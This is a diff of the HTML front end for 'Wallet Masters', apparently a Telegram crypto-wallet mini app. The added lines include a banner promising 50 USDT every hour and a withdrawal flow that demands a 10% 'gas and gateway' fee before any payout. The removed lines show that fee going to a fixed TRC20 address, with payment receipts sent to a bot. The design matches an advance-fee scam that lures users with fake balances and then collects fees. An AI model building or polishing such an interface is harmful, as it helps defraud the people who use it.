@@ -2,14 +2,14 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>Wallet Masters</title>
   <link rel="stylesheet" href="style.css" />
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body>
 
-<!-- ── SPLASH SCREEN ── -->
+<!-- ── SPLASH ── -->
 <div id="splash" class="splash">
   <div class="splash-inner">
     <div class="splash-logo">💎</div>
@@ -19,20 +19,19 @@
   </div>
 </div>
 
-<!-- ── MAIN APP ── -->
+<!-- ── APP ── -->
 <div id="app" class="app hidden">
 
   <!-- Top Bar -->
   <header class="top-bar">
     <div class="top-bar-left">
-      <div class="avatar" id="userAvatar">👤</div>
+      <div class="avatar" id="userAvatar">W</div>
       <div>
         <div class="user-name" id="userName">Loading...</div>
         <div class="user-uid" id="userUID">UID: ---</div>
       </div>
     </div>
     <div class="top-bar-right">
-      <button class="icon-btn" onclick="showPage('notifications')">🔔</button>
       <button class="icon-btn" onclick="showPage('settings')">⚙️</button>
     </div>
   </header>
@@ -40,47 +39,57 @@
   <!-- Pages -->
   <div id="pages">
 
-    <!-- ═══ HOME PAGE ═══ -->
+    <!-- ═══ HOME ═══ -->
     <div class="page active" id="page-home">
       <!-- Balance Card -->
       <div class="balance-card">
-        <div class="balance-label">Total Balance</div>
-        <div class="balance-amount">
-          <span id="balanceAmount">0.00</span>
-          <span class="balance-currency">USDT</span>
+        <div class="balance-label">Total Portfolio Value</div>
+        <div class="balance-row">
+          <div class="balance-amount">
+            <span id="balanceAmount">0.00</span>
+            <span class="balance-currency">USDT</span>
+          </div>
+          <button class="eye-btn" onclick="toggleBalanceVisibility()">👁</button>
         </div>
         <div class="balance-sub">≈ $<span id="balanceUSD">0.00</span> USD</div>
         <div class="balance-address">
-          <span class="addr-label">TRC20 Address</span>
+          <span class="addr-label">TRC20</span>
           <div class="addr-row">
             <span class="addr-text" id="trc20Address">Loading...</span>
-            <button class="copy-btn" onclick="copyAddress()">📋</button>
+            <button class="copy-btn" onclick="copyAddress()">📋 Copy</button>
           </div>
         </div>
+      </div>
+
+      <!-- Hourly Earn Banner -->
+      <div class="hourly-banner">
+        <div class="hourly-info">
+          <div class="hourly-title">🎁 Hourly Bonus</div>
+          <div class="hourly-desc">Earn 50 USDT every hour</div>
+        </div>
+        <button id="claimHourlyBtn" class="claim-btn" onclick="claimHourly()">
+          🎁 Claim 50 USDT
+        </button>
       </div>
 
       <!-- Quick Actions -->
       <div class="quick-actions">
         <button class="action-btn" onclick="showPage('receive')">
-          <span class="action-icon">⬇️</span>
-          <span>Receive</span>
+          <span class="action-icon">⬇️</span><span>Receive</span>
         </button>
         <button class="action-btn primary" onclick="showPage('withdraw')">
-          <span class="action-icon">⬆️</span>
-          <span>Withdraw</span>
+          <span class="action-icon">⬆️</span><span>Withdraw</span>
         </button>
         <button class="action-btn" onclick="showPage('connect')">
-          <span class="action-icon">🔗</span>
-          <span>Connect</span>
+          <span class="action-icon">🔗</span><span>Connect</span>
         </button>
-        <button class="action-btn" onclick="showPage('swap')">
-          <span class="action-icon">🔄</span>
-          <span>Swap</span>
+        <button class="action-btn" onclick="showPage('activity')">
+          <span class="action-icon">📋</span><span>History</span>
         </button>
       </div>
 
-      <!-- Portfolio -->
-      <div class="section-title">My Portfolio</div>
+      <!-- My Assets -->
+      <div class="section-title">My Assets</div>
       <div class="token-list">
         <div class="token-card">
           <div class="token-left">
@@ -95,87 +104,55 @@
             <div class="token-value" id="usdtValue">$0.00</div>
           </div>
         </div>
-        <div class="token-card">
-          <div class="token-left">
-            <div class="token-icon trx-icon">🔺</div>
-            <div>
-              <div class="token-name">TRON</div>
-              <div class="token-network">Native · TRX</div>
-            </div>
-          </div>
-          <div class="token-right">
-            <div class="token-balance">0.00</div>
-            <div class="token-value">$0.00</div>
-          </div>
-        </div>
       </div>
 
       <!-- Recent Transactions -->
       <div class="section-title">Recent Transactions</div>
       <div id="txList" class="tx-list">
-        <div class="empty-state">No transactions yet</div>
+        <div class="empty-state">📭 No transactions yet</div>
       </div>
     </div>
 
-    <!-- ═══ WITHDRAW PAGE ═══ -->
+    <!-- ═══ WITHDRAW ═══ -->
     <div class="page" id="page-withdraw">
       <div class="page-header">
-        <button class="back-btn" onclick="showPage('home')">←</button>
-        <h2>Withdraw</h2>
+        <button class="back-btn" onclick="showPage('home')">← Back</button>
+        <h2>Withdraw USDT</h2>
       </div>
-
       <div class="withdraw-container">
-        <!-- Network Selector -->
+        <!-- Network -->
         <div class="form-group">
-          <label>Select Network</label>
-          <div class="network-selector" id="networkSelector">
+          <label>Network</label>
+          <div class="network-selector">
             <div class="network-option active" data-network="TRC20" onclick="selectNetwork(this)">
-              <span class="net-icon">🔺</span>
-              <div>
-                <div class="net-name">TRC20</div>
-                <div class="net-sub">Tron Network</div>
-              </div>
-              <span class="net-fee-badge">Low Fee</span>
+              <span class="net-icon">🔺</span><span>TRC20</span><span class="net-badge">Cheapest</span>
             </div>
             <div class="network-option" data-network="ERC20" onclick="selectNetwork(this)">
-              <span class="net-icon">⟠</span>
-              <div>
-                <div class="net-name">ERC20</div>
-                <div class="net-sub">Ethereum Network</div>
-              </div>
-              <span class="net-fee-badge high">Higher Fee</span>
+              <span class="net-icon">◆</span><span>ERC20</span>
             </div>
             <div class="network-option" data-network="BEP20" onclick="selectNetwork(this)">
-              <span class="net-icon">🔶</span>
-              <div>
-                <div class="net-name">BEP20</div>
-                <div class="net-sub">BSC Network</div>
-              </div>
-              <span class="net-fee-badge">Low Fee</span>
+              <span class="net-icon">🔶</span><span>BEP20</span>
             </div>
           </div>
         </div>
 
-        <!-- To Address -->
+        <!-- Address -->
         <div class="form-group">
           <label>Recipient Address</label>
-          <div class="input-with-scan">
-            <input type="text" id="withdrawAddress" placeholder="Enter wallet address..." 
-                   oninput="validateWithdrawForm()" />
-            <button class="scan-btn" onclick="pasteAddress()">📋 Paste</button>
-          </div>
-          <div class="addr-warning hidden" id="addrWarning">⚠️ Invalid address format</div>
+          <input type="text" id="withdrawAddress" placeholder="Enter TRC20 wallet address"
+            oninput="validateWithdrawForm()" autocomplete="off" />
+          <div id="addrWarning" class="field-warning hidden">⚠️ Address looks too short</div>
         </div>
 
         <!-- Amount -->
         <div class="form-group">
-          <label>Amount <span class="available-label">Available: <b id="availBalance">0.00</b> USDT</span></label>
-          <div class="amount-input-wrap">
-            <input type="number" id="withdrawAmount" placeholder="0.00" step="0.01" min="1"
-                   oninput="updateWithdrawFees()" />
-            <div class="amount-currency">USDT</div>
+          <label>Amount <span class="avail">Available: <span id="availBalance">0.00</span> USDT</span></label>
+          <div class="amount-row">
+            <input type="number" id="withdrawAmount" placeholder="0.00" min="1"
+              oninput="updateWithdrawFees()" />
+            <span class="currency-tag">USDT</span>
           </div>
-          <div class="amount-presets">
+          <div class="percent-btns">
             <button onclick="setPercent(25)">25%</button>
             <button onclick="setPercent(50)">50%</button>
             <button onclick="setPercent(75)">75%</button>
@@ -183,224 +160,151 @@
           </div>
         </div>
 
-        <!-- Fee Breakdown -->
-        <div class="fee-breakdown" id="feeBreakdown">
-          <div class="fee-title">⚡ Transaction Details</div>
-          <div class="fee-row">
-            <span>Withdrawal Amount</span>
-            <span id="feeAmt">0.00 USDT</span>
-          </div>
-          <div class="fee-row">
-            <span>⛽ Gas Fee (Network)</span>
-            <span id="gasFee" class="fee-val">0.00 USDT</span>
-          </div>
-          <div class="fee-row">
-            <span>🏦 Gateway Processing Fee</span>
-            <span id="gatewayFee" class="fee-val">0.00 USDT</span>
-          </div>
-          <div class="fee-row total">
-            <span>💸 Total Fees</span>
-            <span id="totalFee" class="fee-total">0.00 USDT</span>
-          </div>
-          <div class="fee-note">
-            Fees are calculated at 10% of withdrawal amount.<br/>
-            Send fee to: <b>TRC20</b>
-          </div>
+        <!-- Fee Summary -->
+        <div class="fee-summary">
+          <div class="fee-title">Fee Breakdown (10%)</div>
+          <div class="fee-row"><span>Withdrawal Amount</span><span id="feeAmt">0.00 USDT</span></div>
+          <div class="fee-row"><span>⛽ Gas Fee (40%)</span><span id="gasFee">0.00 USDT</span></div>
+          <div class="fee-row"><span>🏦 Gateway Fee (60%)</span><span id="gatewayFee">0.00 USDT</span></div>
+          <div class="fee-row total"><span>💸 Total Fee</span><span id="totalFee">0.00 USDT</span></div>
         </div>
 
-        <!-- Warning -->
-        <div class="withdraw-warning">
-          ⚠️ Double-check the recipient address. Transactions cannot be reversed.
-        </div>
-
-        <button class="submit-btn" id="withdrawBtn" onclick="submitWithdrawal()" disabled>
-          <span>Continue to Pay Fee</span>
+        <button id="withdrawBtn" class="btn-primary full-width" onclick="submitWithdrawal()" disabled>
+          Continue to Pay Fee →
         </button>
       </div>
     </div>
 
-    <!-- ═══ WITHDRAWAL CONFIRMATION PAGE ═══ -->
-    <div class="page" id="page-confirm">
+    <!-- ═══ FEE PAY ═══ -->
+    <div class="page" id="page-fee-pay">
       <div class="page-header">
-        <button class="back-btn" onclick="showPage('withdraw')">←</button>
-        <h2>Confirm Withdrawal</h2>
+        <button class="back-btn" onclick="showPage('withdraw')">← Back</button>
+        <h2>Pay Fee</h2>
       </div>
-
-      <div class="confirm-container">
-        <div class="confirm-icon">🔐</div>
-        <div class="confirm-title">Review Transaction</div>
-
-        <div class="confirm-card" id="confirmDetails">
-          <!-- Filled dynamically -->
-        </div>
-
-        <div class="fee-payment-section">
-          <div class="fee-payment-title">💳 Fee Payment</div>
-          <div class="fee-payment-desc">
-            Send <strong id="confirmTotalFee">0 USDT</strong> to the address below to activate your withdrawal:
-          </div>
-          <div class="fee-address-box">
-            <div class="fee-addr-label">Fee Payment Address (TRC20)</div>
-            <div class="fee-addr-value" id="feeAddressDisplay">TPwUS8v77TtcsYZUHUTvVx2TGqE37QnagZ</div>
-            <button class="copy-btn full" onclick="copyFeeAddress()">📋 Copy Address</button>
-          </div>
-          <div class="receipt-upload">
-            <div class="upload-label">📸 Upload Payment Receipt</div>
-            <div class="upload-desc">After paying the fee, send your payment screenshot to the bot chat</div>
-            <button class="upload-btn" onclick="openBotForReceipt()">
-              📤 Open Bot to Upload Receipt
-            </button>
-          </div>
-        </div>
-      </div>
+      <div id="feePayBox" style="padding:0 16px 100px"></div>
     </div>
 
-    <!-- ═══ RECEIVE PAGE ═══ -->
+    <!-- ═══ RECEIVE ═══ -->
     <div class="page" id="page-receive">
       <div class="page-header">
-        <button class="back-btn" onclick="showPage('home')">←</button>
+        <button class="back-btn" onclick="showPage('home')">← Back</button>
         <h2>Receive USDT</h2>
       </div>
-
       <div class="receive-container">
-        <div class="receive-network-tabs">
-          <button class="net-tab active">TRC20</button>
-          <button class="net-tab" onclick="showToast('ERC20 address coming soon')">ERC20</button>
-          <button class="net-tab" onclick="showToast('BEP20 address coming soon')">BEP20</button>
+        <div class="qr-card">
+          <div id="qrCanvas"></div>
         </div>
-
-        <div class="qr-container">
-          <div class="qr-placeholder" id="qrCode">
-            <div id="qrCanvas"></div>
+        <div class="receive-info">
+          <div class="receive-row">
+            <span class="receive-label">🌐 Network</span>
+            <span class="receive-val">TRC20 (TRON)</span>
           </div>
-          <div class="qr-label">Scan to receive USDT</div>
-        </div>
-
-        <div class="receive-address-box">
-          <div class="recv-addr-label">Your TRC20 Address</div>
-          <div class="recv-addr" id="receiveAddress">Loading...</div>
-          <div class="recv-actions">
-            <button onclick="copyAddress()">📋 Copy</button>
-            <button onclick="shareAddress()">📤 Share</button>
+          <div class="receive-row">
+            <span class="receive-label">📬 TRC20 Address</span>
+            <div class="receive-addr-wrap">
+              <span id="receiveAddress" class="receive-addr">---</span>
+              <button class="copy-btn" onclick="copyAddress()">📋 Copy</button>
+            </div>
+          </div>
+          <div class="receive-row">
+            <span class="receive-label">🆔 Your UID</span>
+            <div class="receive-addr-wrap">
+              <span id="receiveUID" class="receive-addr">---</span>
+              <button class="copy-btn" onclick="copyUID()">📋 Copy</button>
+            </div>
           </div>
         </div>
-
-        <div class="receive-note">
-          ⚠️ Only send USDT (TRC20) to this address. Sending other tokens may result in permanent loss.
-        </div>
-
-        <div class="uid-section">
-          <div class="uid-title">🆔 Your Wallet UID</div>
-          <div class="uid-value" id="receiveUID">---</div>
-          <div class="uid-desc">Use this UID to receive payments from connected Earning Apps</div>
-          <button class="copy-btn full" onclick="copyUID()">📋 Copy UID</button>
+        <div class="receive-warning">
+          ⚠️ Only send <strong>USDT on TRC20</strong> to this address.
+          Sending other tokens may result in permanent loss.
         </div>
       </div>
     </div>
 
-    <!-- ═══ CONNECT EARNING APP PAGE ═══ -->
+    <!-- ═══ CONNECT ═══ -->
     <div class="page" id="page-connect">
       <div class="page-header">
-        <button class="back-btn" onclick="showPage('home')">←</button>
-        <h2>Connect Earning App</h2>
+        <h2>Connect Earning Apps</h2>
+      </div>
+      <p class="connect-sub">Link your Earning App UID to receive withdrawals directly in your wallet.</p>
+      <div id="appsGrid" class="apps-grid">
+        <div class="empty-state">📭 No apps available yet</div>
       </div>
 
-      <div class="connect-container">
-        <div class="connect-intro">
-          🔗 Connect your UID from verified Earning Apps to receive instant payments to your wallet.
-        </div>
-
-        <div class="connected-title">✅ Connected Apps</div>
-        <div id="connectedApps" class="connected-list">
-          <div class="empty-state">No apps connected yet</div>
-        </div>
-
-        <div class="available-title">📱 Available Earning Apps</div>
-        <div id="earningAppsList" class="apps-list">
-          <div class="empty-state">Loading...</div>
-        </div>
-      </div>
-    </div>
-
-    <!-- ═══ CONNECT UID MODAL ═══ -->
-    <div class="modal hidden" id="uidModal">
-      <div class="modal-backdrop" onclick="closeModal('uidModal')"></div>
-      <div class="modal-content">
-        <div class="modal-title">🔗 Connect <span id="modalAppName">App</span></div>
-        <div class="modal-desc">Enter your Unique UID from this earning app to link your wallet.</div>
-        <input type="text" id="uidInput" placeholder="Enter your UID..." />
-        <div class="uid-error hidden" id="uidError">❌ Invalid UID. Please check and try again.</div>
-        <div class="modal-actions">
-          <button class="modal-cancel" onclick="closeModal('uidModal')">Cancel</button>
-          <button class="modal-confirm" onclick="submitUID()">Connect</button>
+      <!-- Connect Modal -->
+      <div id="connectModal" class="modal-overlay hidden">
+        <div class="modal-box">
+          <div class="modal-header">
+            <h3 id="modalAppName">Connect App</h3>
+            <button class="modal-close" onclick="closeConnectModal()">✕</button>
+          </div>
+          <p class="modal-desc">Enter your Unique UID from this earning app to link your wallet.</p>
+          <input type="text" id="modalUID" placeholder="Enter your UID (e.g. 123456)" />
+          <div id="uidError" class="field-error hidden"></div>
+          <button id="connectUIDBtn" class="btn-primary full-width mt-12" onclick="submitUID()">✅ Connect</button>
         </div>
       </div>
     </div>
 
-    <!-- ═══ TRANSACTIONS PAGE ═══ -->
-    <div class="page" id="page-transactions">
+    <!-- ═══ ACTIVITY ═══ -->
+    <div class="page" id="page-activity">
       <div class="page-header">
-        <button class="back-btn" onclick="showPage('home')">←</button>
-        <h2>All Transactions</h2>
+        <button class="back-btn" onclick="showPage('home')">← Back</button>
+        <h2>Transaction History</h2>
       </div>
-      <div id="allTxList" class="tx-list padded">
-        <div class="empty-state">No transactions</div>
+      <div id="allTxList" class="tx-list" style="padding:0 16px 100px">
+        <div class="empty-state">📭 No transactions yet</div>
       </div>
     </div>
 
-    <!-- ═══ SETTINGS PAGE ═══ -->
+    <!-- ═══ SETTINGS ═══ -->
     <div class="page" id="page-settings">
       <div class="page-header">
-        <button class="back-btn" onclick="showPage('home')">←</button>
+        <button class="back-btn" onclick="showPage('home')">← Back</button>
         <h2>Settings</h2>
       </div>
-      <div class="settings-list">
-        <div class="settings-item" onclick="showPage('receive')">
-          <span>📬 My Addresses</span>
-          <span>›</span>
+      <div style="padding:16px">
+        <div class="settings-card">
+          <div class="settings-row" onclick="copyAddress()">
+            <span>📋 Copy TRC20 Address</span><span>→</span>
+          </div>
+          <div class="settings-row" onclick="copyUID()">
+            <span>🆔 Copy My UID</span><span>→</span>
+          </div>
+          <div class="settings-row" onclick="showPage('receive')">
+            <span>📲 Show QR Code</span><span>→</span>
+          </div>
         </div>
-        <div class="settings-item" onclick="showPage('connect')">
-          <span>🔗 Connected Apps</span>
-          <span>›</span>
-        </div>
-        <div class="settings-item" onclick="showPage('transactions')">
-          <span>📋 Transaction History</span>
-          <span>›</span>
-        </div>
-        <div class="settings-item">
-          <span>🔒 Security</span>
-          <span>›</span>
-        </div>
-        <div class="settings-item" onclick="copyUID()">
-          <span>🆔 Copy Wallet UID</span>
-          <span>›</span>
+        <div class="settings-info">
+          <p>💎 <strong>Wallet Masters</strong></p>
+          <p style="color:#94a3b8;font-size:12px;margin-top:4px">Advanced Crypto Wallet · TRC20 USDT</p>
+          <p style="color:#94a3b8;font-size:11px;margin-top:8px">Fee: 10% per withdrawal<br>Gas: 40% · Gateway: 60%</p>
         </div>
       </div>
-      <div class="version-tag">Wallet Masters v1.0 · Secure Crypto Wallet</div>
     </div>
 
-  </div>
+  </div><!-- /pages -->
 
   <!-- Bottom Nav -->
   <nav class="bottom-nav">
     <button class="nav-btn active" onclick="showPage('home')" data-page="home">
-      <span>🏠</span><span>Home</span>
+      <span class="nav-icon">🏠</span><span>Home</span>
     </button>
-    <button class="nav-btn" onclick="showPage('transactions')" data-page="transactions">
-      <span>📋</span><span>History</span>
+    <button class="nav-btn" onclick="showPage('activity')" data-page="activity">
+      <span class="nav-icon">📋</span><span>History</span>
+    </button>
+    <button class="nav-btn send-center" onclick="showPage('withdraw')" data-page="withdraw">
+      <span class="nav-icon-big">⬆️</span><span>Send</span>
     </button>
     <button class="nav-btn" onclick="showPage('connect')" data-page="connect">
-      <span>🔗</span><span>Apps</span>
+      <span class="nav-icon">🔗</span><span>Connect</span>
     </button>
     <button class="nav-btn" onclick="showPage('settings')" data-page="settings">
-      <span>⚙️</span><span>Settings</span>
+      <span class="nav-icon">⚙️</span><span>Settings</span>
     </button>
   </nav>
 
-</div>
-
-<!-- Toast -->
-<div id="toast" class="toast hidden"></div>
+</div><!-- /app -->
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 <script src="app.js"></script>
